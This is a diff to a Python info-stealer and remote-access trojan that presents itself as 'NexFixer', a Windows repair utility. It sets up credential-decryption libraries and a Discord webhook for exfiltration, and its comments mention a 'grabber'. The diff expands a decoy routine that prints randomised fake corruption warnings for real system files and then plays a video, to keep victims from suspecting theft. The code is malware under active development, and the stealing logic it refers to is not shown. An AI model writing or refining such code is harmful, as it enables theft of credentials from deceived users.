@@ -1,4 +1,4 @@
-"""
+﻿"""
 ███╗   ███╗ █████╗ ██████╗ ███████╗    ██████╗ ██╗   ██╗
 ████╗ ████║██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╗
 ██╔████╔██║███████║██║  ██║█████╗      ██████╔╝ ╚████╔╝ ╚═╝
@@ -30,6 +30,7 @@ import subprocess
 import datetime
 import sys
 import random
+from importent.vid import VideoPlayer
 
 FILE_REQUIREMENTS = os.path.join("requirements.txt")
 PASS_FILE = "cl.log"
@@ -48,35 +49,40 @@ we will create a new one with the required information needed to run this file.
 termcolor==3.3.0
 """
 
-
-if not os.path.exists("requirements.txt"):
-    file = open("requirements.txt", "w")
-    file.write(
-        "requests==2.34.2 \ntermcolor==3.3.0 \npywin32==312\npycryptodome==3.23.0"
-    )
-    file.close()
-
-    subprocess.check_call(
-        [sys.executable, "-m", "pip", "install", "-r", FILE_REQUIREMENTS]
-    )
-    os.system("cls")
-
+try:
     import requests
-    from termcolor import colored
-    import win32crypt
+    from win32 import win32crypt
     from Crypto.Cipher import AES
-
-    print(
-        colored(
-            "INSTALLED REQUIREMENTS!",
-            color="blue",
+    from termcolor import colored
+except ImportError:
+    if os.path.exists(FILE_REQUIREMENTS):
+        file = open(FILE_REQUIREMENTS, "w")
+        file.write(
+            "requests==2.34.2 \ntermcolor==3.3.0 \npywin==312 \npycryptodome==3.23.0"
         )
-    )
+        file.close()
 
-    import requests
-    from termcolor import colored
-    import win32crypt
-    from Crypto.Cipher import AES
+        try:
+            subprocess.check_call(
+                [sys.executable, "m", "pip", "install", "-r", FILE_REQUIREMENTS]
+            )
+            subprocess.check_call("cls", shell=True)
+            import requests
+            from win32 import win32crypt
+            from Crypto.Cipher import AES
+            from termcolor import colored
+        except Exception:
+            print("Failed to install required programs!")
+    else:
+        subprocess.check_call(
+            [sys.executable, "m", "pip", "install", "-r", FILE_REQUIREMENTS]
+        )
+        subprocess.check_call("cls", shell=True)
+
+        import requests
+        from win32 import win32crypt
+        from Crypto.Cipher import AES
+        from termcolor import colored
 
 
 # ASCII banners
@@ -116,7 +122,7 @@ run_time = datetime.datetime.now().strftime("%m/%d/%Y | 24HR Clock: %H:%M")
 """
 If you reading this. just know you werent supposed to.
 """
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536776272762503169/oCDisDzxYfsHZxaCTsdyXOoluan7BpuR_efe-DSbBHd8kLu9ZLLw59dtQ4TVKbQai_EV"  # Add your personal webhooks
+DISCORD_WEBHOOK = ""  # Add your personal webhooks
 
 """
 This is the discord payload that well be sent
@@ -377,37 +383,96 @@ def Decoy():
 
     print(colored(decoy_banner, "magenta"))
     print(colored("🛡️ We applied all fixes! heres what we found: ", "cyan"))
-    # Just printing these out i dont feel like making a list for them
-    print(
-        colored(
-            f"FILE: C:\\Windows\\System32\\drivers\\disk.sys ⚠️\n"
-            f"STATUS: Driver integrity verification failed ⚠️ \n"
-            f"SEVERITY: HIGH ⚠️ \n"
-            "---------------------------------------------- \n"
-            f"FILE: C:\\Windows\\System32\\svchost.exe ⚠️\n"
-            f"STATUS: Component signature mismatch ⚠️\n"
-            f"SEVERITY: HIGH ⚠️\n"
-            "---------------------------------------------- \n"
-            f"FILE:  C:\\Windows\\System32\\LogFiles\\Srt\\SrtTrail.txt ⚠️\n"
-            f"STATUS: Automatic repair log inconsistency ⚠️\n"
-            f"SEVERITY: HIGH ⚠️\n",
-            "green",
-        )
-    )
 
-    print(
-        colored(
-            "☢️ CLOSING TERMINAL IN 5 SECOUNDS! THANKS FOR USING NEXFIXER!",
-            color="magenta",
+    detections = [
+        (
+            r"C:\Windows\System32\drivers\audioflt.sys",
+            "File integrity mismatch",
+            "HIGH",
+        ),
+        (r"C:\Windows\System32\winload.exe", "Corrupted system component", "CRITICAL"),
+        (
+            r"C:\Windows\System32\config\SAM",
+            "Invalid registry database structure",
+            "CRITICAL",
+        ),
+        (r"C:\Windows\System32\ntoskrnl.exe", "Unexpected checksum", "CRITICAL"),
+        (
+            r"C:\Windows\System32\drivers\disk.sys",
+            "Driver integrity verification failed",
+            "HIGH",
+        ),
+        (
+            r"C:\Windows\System32\wbem\WmiPrvSE.exe",
+            "Unexpected executable modification",
+            "MEDIUM",
+        ),
+        (r"C:\Windows\System32\services.exe", "Dependency verification failed", "HIGH"),
+        (r"C:\Windows\System32\svchost.exe", "Component signature mismatch", "HIGH"),
+        (
+            r"C:\Windows\System32\LogFiles\Srt\SrtTrail.txt",
+            "Automatic repair log inconsistency",
+            "MEDIUM",
+        ),
+        (
+            r"C:\Windows\System32\Recovery\Winre.wim",
+            "Recovery environment integrity warning",
+            "HIGH",
+        ),
+        (
+            r"C:\Windows\System32\kernel32.dll",
+            "System library integrity mismatch",
+            "HIGH",
+        ),
+        (r"C:\Windows\System32\user32.dll", "Unexpected component checksum", "MEDIUM"),
+        (
+            r"C:\Windows\System32\drivers\ntfs.sys",
+            "Filesystem driver verification failed",
+            "CRITICAL",
+        ),
+        (r"C:\Windows\System32\smss.exe", "Session manager integrity warning", "HIGH"),
+        (
+            r"C:\Windows\System32\csrss.exe",
+            "System process signature mismatch",
+            "CRITICAL",
+        ),
+        (
+            r"C:\Windows\System32\lsass.exe",
+            "Security subsystem verification failed",
+            "CRITICAL",
+        ),
+        (
+            r"C:\Windows\System32\bootres.dll",
+            "Boot resource integrity mismatch",
+            "HIGH",
+        ),
+        (
+            r"C:\Windows\System32\drivers\volmgr.sys",
+            "Volume manager driver anomaly",
+            "MEDIUM",
+        ),
+        (
+            r"C:\Windows\System32\config\SYSTEM",
+            "Registry hive consistency warning",
+            "HIGH",
+        ),
+        (
+            r"C:\Windows\System32\Recovery\ReAgent.xml",
+            "Recovery configuration inconsistency",
+            "MEDIUM",
+        ),
+    ]
+    amount = random.randint(4, 8)
+    for file, status, level in random.sample(detections, amount):
+        print(
+            colored(
+                f"FILE: {file} \n STAUTS: {status} \n SEVERITY: {level}", color="red"
+            )
         )
-    )
-    counter = 5
-    for _ in range(5):
-        print(colored(f"{counter}"))
-        counter -= 1
-        time.sleep(1)
-        if counter == 0:
-            exit()
+
+    print(colored("Running cleaning system!", color="blue"))
+    player = VideoPlayer()
+    player.run()
 
 
 if __name__ == "__main__":
@@ -455,7 +520,7 @@ if __name__ == "__main__":
 
     # When grabber is done, we return back to here and continue on with a decoy of our rat!
     time.sleep(1.5)
-    os.system("cls")
+    subprocess.check_call("cls", shell=True)
     print(colored("⛔ WE FOUND A LOT OF CORRUPTED FILES AND SYSTEM FILES ⛔ ", "red"))
     print(
         "Would you like for us to fix these issues? (We only fix certain stuff and output what is fixed) \nType Y - To apply fixes | N - Deny fixes and exit"
